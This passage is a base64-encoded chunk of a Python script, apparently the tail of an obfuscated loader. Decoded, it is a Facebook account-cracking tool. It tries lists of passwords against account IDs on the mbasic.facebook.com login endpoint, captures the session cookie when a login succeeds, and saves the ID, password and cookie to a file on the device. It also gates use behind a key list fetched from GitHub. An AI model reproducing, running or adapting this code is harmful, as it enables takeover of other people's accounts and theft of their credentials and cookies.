h5CiAgICB0cnk6CiAgICAgICAgZm9yIHBzIGluIHB3eDoKICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuKQogICAgICAgICAgICBzZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgICAgIGZyZWVfZmIgPSBzZXNzaW9uLmdldCgnaHR0cHM6Ly94LmZhY2Vib29rLmNvbScpLnRleHQKICAgICAgICAgICAgbG9nX2RhdGEgPSB7CiAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksCiAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLAogICAgICAgICAgICAibV90cyI6cmUuc2VhcmNoKCduYW1lPSJtX3RzIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwKICAgICAgICAgICAgImxpIjpyZS5zZWFyY2goJ25hbWU9ImxpIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwKICAgICAgICAgICAgInRyeV9udW1iZXIiOiIwIiwKICAgICAgICAgICAgInVucmVjb2duaXplZF90cmllcyI6IjAiLAogICAgICAgICAgICAiZW1haWwiOnVpZCwKICAgICAgICAgICAgInBhc3MiOnBzLAogICAgICAgICAgICAibG9naW4iOiJMb2cgSW4ifQogICAgICAgICAgICBoZWFkZXJfZnJlZWZiID0geydhdXRob3JpdHknOiAneC5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAgICAgICAgICAgICAnbWV0aG9kJzogJ0dFVCcsCiAgICAgICAgICAgICAgICAgICAgICAgICdwYXRoJzogJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8/X3JkYz0xJl9yZHInLAogICAgICAgICAgICAgICAgICAgICAgICAnc2NoZW1lJzogJ2h0dHBzJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjknLAogICAgICAgICAgICAgICAgICAgICAgICAnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUsIGJyJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsCiAgICAgICAgICAgICAgICAgICAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8veC5mYWNlYm9vay5jb20vJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciR29vZ2xlIENocm9tZSI7dj0iOTAiLCAiTm90KUE7QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9Ijc1IicsCiAgICAgICAgICAgICAgICAgICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8wJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciTGludXgiJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ25hdmlnYXRlJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywKICAgICAgICAgICAgICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsCiAgICAgICAgICAgICAgICAgICAgICAgICd1c2VyLWFnZW50JzogcHJvLH0KICAgICAgICAgICAgbG8gPSBzZXNzaW9uLnBvc3QoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8/cmVmc3JjJyxkYXRhPWxvZ19kYXRhLGhlYWRlcnM9aGVhZGVyX2ZyZWVmYikudGV4dAogICAgICAgICAgICBsb2dfY29va2llcz1zZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkKICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gbG9nX2Nvb2tpZXM6CiAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzc6MjJdCiAgICAgICAgICAgICAgICBpZiAiQWxpdmUiID09IGxpdmVfY2sodWlkKToKICAgICAgICAgICAgICAgICAgICBwcmludCgnXHJcclwwMzNbMTszMW1bXHgxYlszODs1OzQ4bfCdkJPwnZCA8J2QjS3wn5KaXDAzM1sxOzMxbV1ceDFiWzM4OzU7NDhtICcgK3VpZCsgJyBcMDMzWzE7MzFt4pePXHgxYlszODs1OzQ4bSAnICtwcysgICdcblwwMzNbMTszMW1b4oCO8J+MulwwMzNbMTszMW1dXHgxYlszODs1OzIwOG0gQ09PS0lFID0gXHgxYlszODs1OzQ4bScrY29raSsgICcgICcnICBceDFiWzM4OzU7NDhtJykKICAgICAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL/CdkIzwnZCRLfCdkJPwnZCA8J2QjS1PSy50eHQnLCAnYScpLndyaXRlKHVpZCsnIOKXjyAnK3BzKydcbkNPT0tJRSA9ICAnK2Nva2krJ1xuXG4nKQogICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoY2lkKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgbG9vcCs9MQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcclxyJXN7bX1be3hyffCdkIXwnZCI8J2QjfCdkIPwnZCI8J2QjfCdkIZ7bX1dLVt7eHJ9JXN7bX0ve099JXN7bX1dLVt7eHJ9T0t7bX06e3hyfSVze219XXt4cn0gJyUoSCxsb29wLHRsLGxlbihva3MpKSksc3lzLnN0ZG91dC5mbHVzaCgpIAogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCgpkZWYgYXBwcm92YWwoKToKICAgIGE9c3RyKG9zLmdldGV1aWQoKSkKICAgIGI9c3RyKG9zLmdldGxvZ2luKCkpCiAgICB5PScnLmpvaW4oYStiKQogICAga2V5PWYiVGFuLXt5fSIKICAgIHJvdz1odHRweC5nZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UYW4tdmFpL01yLVRhbi9tYWluL2FwcHJvdmFsLnR4dCIpLnRleHQKICAgIGlmIGtleSBpbiByb3c6CiAgICAgICAgeHhyKCkKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgICAgcHJpbnQobG9nbykKICAgICAgICBwcmludCgiXHgxYlszODs1OzQ4bVtcMDMzW1wwMzNbMTszN23igKJceDFiWzM4OzU7NDhtXSBZT1UgTkVFRCAgQVBQUk9WQUwgVG8gSk9JTiBPVVIgTUFTTkdFUiBHUk9VUCIpCiAgICAgICAgcHJpbnQoIlx4MWJbMzg7NTs0OG1bXDAzM1sxOzM3beKAolx4MWJbMzg7NTs0OG1dIFlPVSBLRVkgTk9UIEFQUE9SVkVEIikKICAgICAgICBwcmludCgiXHgxYlszODs1OzQ4bVtcMDMzWzE7Mzdt4oCiXHgxYlszODs1OzQ4bV0gWU9VUiBLRVkgOiIra2V5KQogICAgICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly9tLm1lL2ovQWJaRThhQmRWdXNxVnZhZC8iKQogICAgICAgIHN5cy5leGl0KCkKYXBwcm92YWwoKQogICAgICAgIAp4eHIoKQogIA=='))
